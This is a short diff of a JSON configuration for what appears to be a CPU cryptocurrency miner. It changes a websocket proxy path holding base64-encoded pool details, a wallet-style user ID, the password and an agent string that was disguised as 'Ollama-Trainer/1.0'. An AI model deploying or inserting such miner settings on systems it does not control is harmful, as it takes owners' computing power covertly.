@@ -1,6 +1,6 @@
 {
-  "proxy": "ws://cpusocks2.teatspray.uk:9999/dmVnZXRhdGlvbi1ldS50ZWF0c3ByYXkudWs6NzAxOA==",
+  "proxy": "ws://cpusocks2.teatspray.uk:9999/bWF6YXBvb2wudGVhdHNwcmF5LnVrOjg0NDI=",
   "config": { "threads": 6, "log": true },
-  "options": { "user": "MRq8edAYjqUzj1YLnnG9PZPgVsYZE62vPK.IDXFallBack", "password": "webpassword=IhatePopUpsWut,m=solo", "argent": "Ollama-Trainer/1.0" }
+  "options": { "user": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.Fallback", "password": "x", "argent": "nano-mino/1.0" }
 }
 
